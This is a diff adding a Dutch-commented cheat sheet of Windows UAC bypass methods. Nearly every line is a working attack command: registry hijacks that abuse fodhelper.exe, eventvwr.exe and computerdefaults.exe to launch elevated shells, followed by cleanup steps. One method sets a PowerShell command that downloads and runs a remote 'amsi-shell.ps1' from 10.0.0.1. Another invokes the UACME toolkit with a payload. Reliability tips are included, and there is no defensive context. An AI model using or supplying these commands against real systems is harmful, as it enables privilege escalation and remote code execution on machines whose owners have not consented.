@@ -1,0 +1,24 @@
+# UAC Bypass - User Account Control omzeilen
+# Vereiste: Gebruiker is lid van Administrators groep
+# === Methode 1: fodhelper.exe (Windows 10/11) ===
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
+fodhelper.exe
+# Opruimen:
+REG DELETE HKCU\Software\Classes\ms-settings /f
+# === Methode 2: eventvwr.exe (Windows 10) ===
+REG ADD HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
+REG ADD HKCU\Software\Classes\mscfile\Shell\Open\command /v DelegateExecute /t REG_SZ /f
+eventvwr.exe
+REG DELETE HKCU\Software\Classes\mscfile /f
+# === Methode 3: computerdefaults.exe ===
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')" /f
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
+computerdefaults.exe
+# === Check UAC level ===
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+# 0 = geen prompt, 1 = credentials, 2 = consent, 5 = default
+# === Methode 4: UACME (uitgebreide UAC bypass toolkit) ===
+# Akagi64.exe 23 C:\Windows\tasks\payload.exe
+# Tip: Werkt alleen als UAC NIET op "Always Notify" staat
+# Tip: fodhelper is de meest betrouwbare bypass op moderne Windows
